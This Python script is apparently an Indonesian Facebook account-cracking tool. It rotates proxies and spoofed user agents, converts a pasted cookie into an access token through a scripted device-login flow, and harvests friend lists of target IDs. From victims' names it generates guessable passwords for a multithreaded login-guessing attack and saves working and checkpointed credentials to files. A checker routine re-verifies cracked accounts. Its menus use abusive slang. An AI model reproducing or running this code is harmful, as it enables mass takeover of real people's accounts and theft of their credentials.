#/usr/bin/python/#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        print('>> Sedang Menginstall Modul Rich <<')
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        print('>> Sedang Menginstall Modul Stdiomask <<')
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	print('>> Sedang Menginstall Modul Requests & Mechanize <<')
	os.system('pip install requests && pip install mechanize ')

pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
pwpluss,pwnya=[],[]
ses=requests.Session()
princp=[]
sys.stdout.write('\x1b]2; Christian S. \x07')
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mJaringan Internet Anda Bermasalah')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
for t in range(10000):
	a=random.choice([
									"4",
									"5",
									"6",
									"7",
									"8",
									"9",
									"10",
									"11",
									"12",
									"13",
									"9.1.5",
									"5.1.6",
									"4.0.1",
									"3.0.1",
									"4.0.2",
									"5.0.2",
									"6.0.1",
									"6.2.2",
									"7.0.1",
									"7.1.0",
									"8.1.0",
									"4.4.4",
									"5.6.1",
									"6.1.3"
									])
	b=random.choice([
									'en-us',
									'en-gb',
									'id-id',
									'de-de',
									'ru-ru',
									'en-sg',
									'fr-fr',
									'fa-ir',
									'ja-jp',
									'pt-br',
									'cs-cz',
									'zh-hk',
									'zh-cn',
									'vi-vn',
									'en-ph',
									'en-in',
									'tr-tr'
									])
	c=random.choice([
									"Redmi 7",
									"Redmi Note 8",
									"Redmi 6A",
									"Mi 9 Lite",
									"Redmi Note 11 Pro",
									"Redmi 5A",
									"Mi 9 SE",
									"POCO M4 Pro",
									"POCO X3 Pro",
									"Redmi 5 Plus",
									"Redmi Note 10 Pro",
									"M2007J22G",
									"Redmi 9C NFC"
									])
	d=random.choice([
									'OPM1',
									'TP1A',
									'RP1A',
									'PPR1',
									'PKQ1',
									'QP1A',
									'SP1A',
									'RKQ1'
									])
	e=random.choice([
									'001',
									'002',
									'003',
									'004',
									'005',
									'006',
									'007',
									'008',
									'009',
									'010',
									'011',
									'012',
									'013',
									'014',
									'015',
									'016',
									'017',
									'018',
									'019',
									'020'
									])
	f=random.randrange(111111,199999)
	g=random.randrange(10,300)
	h=random.randrange(1111,9999)
	i=random.randrange(20,100)
	j=random.choice([
									"XiaoMi/MiuiBrowser/13.23.2-gn",
									"XiaoMi/MiuiBrowser/13.13.2-gn",
									"XiaoMi/MiuiBrowser/13.16.1-gn",
									"XiaoMi/MiuiBrowser/13.25.2.1-gn",
									"XiaoMi/MiuiBrowser/12.15.3-go",
									"XiaoMi/MiuiBrowser/13.29.0-gn",
									"XiaoMi/MiuiBrowser/13.28.0-gn",
									"XiaoMi/MiuiBrowser/12.7.5-go",
									"XiaoMi/MiuiBrowser/13.28.0-gn",
									"XiaoMi/MiuiBrowser/12.22.0.3-gn"
									])
	kondom1=f'Mozilla/5.0 (Linux; U; Android {a}; {b}; {c} Build/{d}.{f}.{e}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{g}.0.{h}.{i} Mobile Safari/537.36 {j}'
	kondom2=f'Mozilla/5.0 (Linux; U; Android {a}; {b}; {c}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{g}.0.{h}.{i} Mobile Safari/537.36 {j}'
	uaku2 = random.choice([kondom1,kondom2])
	ugen.append(uaku2)
	
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
	
###ip = requests.get('https://api.ipify.org').text
#wanji = requests.get('https://user-agents.net/download?browser=facebook&download=txt').text

try:aan = open('samsung.txt','r').read().splitlines()
except:aan = ["Mozilla/5.0 (Linux; Android 11; Mi Note 10 Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]."]

def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

sir = '\033[41m\x1b[1;97m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
A = '\x1b[0;33m'
N = '\x1b[0m'    
E = '\033[38;2;255;127;0;1m'
HA = '\x1b[0;32m'
KU = '\x1b[0;33m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m'
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m'
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
asu = random.choice([M,U,K,A,B,E,H,O,P])
azu = random.choice([M,U,K,A,B,E,O,P])

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

class Yowaimo:
	
    def __init__(self):
        self.ses=requests.Session()
        ambil = open('.cok.txt','r').read()
        self.cok = {"cookie": ambil}
       #os.system("clear")
        self.cek()

    def cek(self):
        cp = []
        try:
            xxx = os.listdir("result")
            for z in xxx:
                cp.append(z)
        except:pass
        if len(cp)==0:
            exit("Tidak ada file di dalam folder result silahkan crack terlebih dahulu")
        else:
            xa, xx = {}, 0
            for x in cp:
                try:xz = open(f"result/{x}").readlines()
                except:continue
                xx+=1
                if xx<100:
                    nom = ""+str(xx)
                    xa.update({str(xx):str(x)})
                    xa.update({nom+"0":str(xx)})
                    print(f" ├─[{H}{nom}{P}] {x} Total > [{H}{str(len(xz))}{P}] ")
                else:
                    xa.update({str(xx):str(x)})
                    print(f" ├─[{H}{nom}.{P}]  {x} Total > {str(len(xz))}")
        file = input(" └───➢ \t")
        pemi = input(f" [{H}#{P}] Masukan Pemisah : \t ")
        try:ajg = xa[file]
        except KeyError:
            print("input yang bener")    
        try:
            fi = open(f"result/{ajg}").readlines()
        except FileNotFoundError:
            print("Tidak ada file di dalam folder result silahkan crack terlebih dahulu")
        for yxz in fi:
            user = yxz.replace("\n", "")
            usez = user.split(pemi)
            self.log_hasil(usez[0], usez[1])

    def log_hasil(self, user, pasw):
        try:
            link = self.ses.get(f"https://mbasic.facebook.com/{user}/friends", cookies=self.cok).text
            #exit(link)
            cari = re.findall('<h3 class\=\".*?">(.*?)</h3>', link)
            if "mbasic_logout_button" not in str(link):
                exit(f"\n[{M}!{N}] akun tumbal anda terkena checkpoint, silahkan beralih akun")
            elif "Anda Diblokir Sementar" in str(link):
                exit(f"\n[{M}!{N}] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun")
            elif "/zero/optin/write" in str(link):
                exit(f"\n[{M}!{N}] akun tumbal anda menggunakan free Facebook, silahkan ubah ke mode data.")
            elif "0" in str(len(cari)):
                print(f"{K}[CP] {user}|{pasw}{N}")
                open("result/CP.txt", "a").write(f"{user}|{pasw}\n")
            else:
                print(f"{H}[OK] {user}|{pasw} {cari[0]}{N}")
                open("result/OK.txt", "a").write(f"{user}|{pasw}\n")
        except Exception as e:exit(e)

def coli(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
def clear():
	os.system('clear')
def back():
	login()

def banner():
	print(f'''{asu}>>[=]<<''')

def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		your_cookies = input(f'{P}└─ Cookie : {asu} ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(f"└─Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n{P}└─Token :{asu} {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print(f"{P}└─Login Berhasil.... ");exit()
			except Exception as e:
				coli(f"{P}└─Login Gagal.... ")
				os.system('rm -rf .token.txt && rm -rf mcok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass

def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		requests.post("https://graph.facebook.com/1781113094?fields=subscribers&access_token=%s"%(tokenku))
	except IOError:
		coli(f'└─Cookie Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	
	print(f'''
	  ⬜⬜⬜⬜⬜⬜⬜🏽🏽🏽🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜
          ⬜⬜⬜⬜⬜⬜🏽⬜⬜⬜⬜🏽🏽🏽🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜
          ⬜⬜⬜⬜⬜🏽⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽🏽🏽⬜⬜⬜⬜⬜⬜
          ⬜⬜⬜⬜⬜🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽🏽⬜⬜⬜⬜
          ⬜⬜⬜⬜⬜🏽🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽⬜⬜⬜
          ⬜⬜⬜⬜⬜🏽⬛🏽🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽⬜⬜
          ⬜⬜⬜⬜⬜⬜🏽⬛⬛🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽⬜⬜
          ⬜⬜⬜⬜⬜⬜⬜⬜⬛⬛🏽🏽🏽🏽⬜⬜⬜⬜⬜⬜⬜🏽⬜⬜
          ⬜⬜🟨🟨🟨🟨🟨⬛🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽⬜
          🟨🟨🟨🟨🟨🟨🟨🟨🟧⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽⬜
          🟨🟧🟨🟨🟨🟨🟨🟨🟨🟧⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽⬜
          🟨🟨🟧🟧🟨🟨🟨🟨🟨🟨🟧⬜🏽🏽⬜⬜⬜⬜⬜⬜⬜⬛⬜⬜
          🟧🟨🟨🟨🟧🟧🟧🟦🟦🟧🟧🟧🟧⬛🏽⬜⬜⬜⬜⬜⬜⬛⬜⬜
          ⬜🟧🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧⬛🏽⬜⬜⬜⬜⬜⬛⬜⬜
          ⬜⬜🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟧⬛🏽⬜⬜⬜🏽⬛⬜⬜
          ⬜⬜⬛🟦🟦🟦🟦🟦⬛🟦⬛🟦🟦🟧🟧🟧⬛🏽⬜⬜🏽⬛⬜⬜
          ⬜⬛⬛🟦🟦🟦🟦🟦⬛⬛🟦🟦🟧🟨🟨🟨⬛🏽⬜🏽⬛⬜⬜⬜
          ⬜⬜⬛⬛🟦🟦⬛⬛⬜🟦🟦🟦🟧🟨🟨🟨🟧⬛🏽⬛⬛⬜⬜⬜
          ⬜🟦⬜⬛🟦🟦⬛⬛🟦🟦🟦🟦🟧🟨🟨🟨🟨🏽⬛⬛⬜⬜⬜⬜
          ⬜🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟧⬛🟧⬜⬜⬜⬜
          ⬜🟦⬛🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟧
          ⬜⬛🟦⬛⬛🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟧🟨🟨🟨🟨🟨🟨🟨
          ⬜⬛🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟧🟨🟨🟨🟨🟨🟨
          ⬜⬜⬛🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟨🟧🟨🟨🟧🟨🟨
          ⬜⬜⬜⬛⬛🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟧🟨🟨🟧🟧🟨
          ⬜⬜⬜🟨🟧⬛⬛⬛⬛⬛⬛🟦⬜🏽🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨
          ⬜⬜⬜🟧🟨🟨🟨🟧🟦🟦🟦⬜⬜⬜🟧🟨🟨🟨🟨🟨🟨🟨🟨🟧
''')
	
	coli(f'                  {P}Developed By : [ {k}Christian S.{P} ]\n')
	print(f'{P}─────────────────────────────────────────────────────')
	print(f' ┌─[ Hallo Selamat Datang! {T}{my_name}{P} ]\n ├───➢ ID Kamu [ {P} {my_id} {P} ]')
	hariok()
	haricp()
	###print(f' ├─[ IP : {} {ip} {P}]')
	print(f' ├─[ Total User Agent Saat Ini ]\n └───➢  [ {O}'+str(len(aan))+P, '] Biji')
	print(f'{P}─────────────────────────────────────────────────────\n')
	print(f'{P} ┌─[{H}1{P}] Crack Publik')
	print(f'{P} ├─[{H}2{P}] Hasil Crack')
	print(f'{P} ├─[{H}3{P}] Cek CP 🗿')
	print(f'{P} ├─[{H}0{P}] Hapus Cookie')
	janda = input(f' └───➢ \t')
	
	if janda in ['1']:
		dump_massal()
	elif janda in ['2']:
		result()
	elif janda in ['3']:
		Yowaimo()
	elif janda in ['4']:
		haricp();hariok()
	elif janda in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('[#] Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('>> Pilih Yang Bener Asu ')
		back()
def error():
	print(f'{k}>> Sepertinya Ada Kesalahan Dalam Memilih Fitur')
	time.sleep(4)
	back()
	
def haricp():
	cp = []
	try:
		xxx = os.listdir("CP")
		for z in xxx:
			cp.append(z)
	except:pass
	if len(cp)==0:
		exit("Tidak ada file di dalam folder result silahkan crack terlebih dahulu")
	else:
		xa, xx = {}, 0
		for x in cp:
			try:xz = open(f"CP/{cpc}").readlines()
			except:continue
		xx+=1
		if xx<100:
			nom = ""+str(xx)
			xa.update({str(xx):str(x)})
			xa.update({nom+"0":str(xx)})
			print(f" ├─[😔] {k}{x} {P}[ {k}{str(len(xz))}{P} ] ")
			
def hariok():
	ok = []
	try:
		xxx = os.listdir("OK")
		for z in xxx:
			ok.append(z)
	except:pass
	if len(ok)==0:
		exit("Tidak ada file di dalam folder result silahkan crack terlebih dahulu")
	else:
		xa, xx = {}, 0
		for x in ok:
			try:zx = open(f"OK/{okc}").readlines()
			except:continue
		xx+=1
		if xx<100:
			nom = ""+str(xx)
			xa.update({str(xx):str(x)})
			xa.update({nom+"0":str(xx)})
			print(f" ├─[😋] {H}{x} {P}[ {H}{str(len(zx))}{P} ] ")

def result():
	print(f'{P}─────────────────────────────────────────────────────')
	print(f'┌─[{H}1{P}] Hasil {h}OK{P} Anda ')
	print(f'├─[{K}2{P}] Hasil {k}CP{P} Anda ')
	#print(f'├─[{M}3{P}] Kembali	')
	kz = input(f'└───➢ ')
	print(f'{P}─────────────────────────────────────────────────────')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					
					print(f'{P}├─[{K}%s{P}] Hasil %s ({k} %s {P}Akun )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
					print(f'{P}─────────────────────────────────────────────────────')
			geeh = input(f'└───➢ ')
			print(f'{P}─────────────────────────────────────────────────────')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{P}├─[{K}#{P}] {k}{cpkuni[0]}{P}│{k}{cpkuni[1]}')
				nocp +=1
			print(f'{P}─────────────────────────────────────────────────────')
			input(f'{P}[{m} Klik Enter{P} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<50:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P}├─[{H}%s{P}] Hasil %s ({h}%s{P} Akun)'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P}├─[{H}%s{P}] Hasil %s ({h}%s {P}Akun)'%(cih,isi,(len(hem))))
			geeh = input(f'└────➢ ')
			print(f'{P}─────────────────────────────────────────────────────')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				#print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				print(f'{P}├─[{H}#{P}] {h}{cpkuni[0]}{P}│{h}{cpkuni[1]}\n{P}├─[{H}#{P}] {h}{cpkuni[2]}')
				nocp +=1
			print(f'{P}─────────────────────────────────────────────────────')
			input(f'{P}[{m}Klik Enter{P}]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		back()

def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f'{P}─────────────────────────────────────────────────────')
		jum = int(input(f'{P} ┌─[{H}•{P}] Mau Berapa Id ? : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		###kl = input(f'{P}├─['+str(yz)+'] Enter the Id : ')
		kl = input(f' ├─[{H}•{P}] Masukan Id Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> Sinyal Loh Kek Kontoll ')
			exit()
	try:
		coli(f' └───➢ Id Terkumpul : {H} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('>> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()

def setting():
	print(f'{P}─────────────────────────────────────────────────────')
	print(f'{P}┌─[{H}1{P}] Crack Dari Id Acak ')
	print(f'├─[{H}2{P}] Crack Dari Id Termuda ')
	hu = input('└───➢ ')
	if hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	print(f'{P}─────────────────────────────────────────────────────')
	print(f'{P}┌─[{H}1{P}] Validate [{H} Recommend {P}]')
	print(f'{P}├─[{H}2{P}] Async    ')
	hc = input('└───➢ ')
	if hc in ['1','01']:
		method.append('satu')
	elif hc in ['']:
		print('>> Pilih Yang Bener Kontol ')
		setting()
	elif hc in ['2','02']:
		method.append('dua')
	else:
		method.append('satu')

	print(f'{P}─────────────────────────────────────────────────────')
	pwplus=input(f'{P}┌─[{H}•{P}] Tambahkan Password Manual ( y/t ) : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f'{P}└───➢  ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no','t')
	passwrd()

def passwrd():
	print(f'{P}─────────────────────────────────────────────────────')
	print(f'┌─{P}[{H}#{P}] Hasil {h}OK{P} Tersimpan Di : {h}OK/%s {P}'%(okc))
	print(f'└─{P}[{k}#{P}] Hasil {k}CP{P} Tersimpan Di : {k}CP/%s {P}'%(cpc))
	print(f'{P}─────────────────────────────────────────────────────')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'321')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'321')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'satu' in method:
				pool.submit(crack,idf,pwv)
			elif 'dua' in method:
				pool.submit(crack2,idf,pwv)
			else:
				pool.submit(crack2,idf,pwv)
	print(f'{P}\n─────────────────────────────────────────────────────')
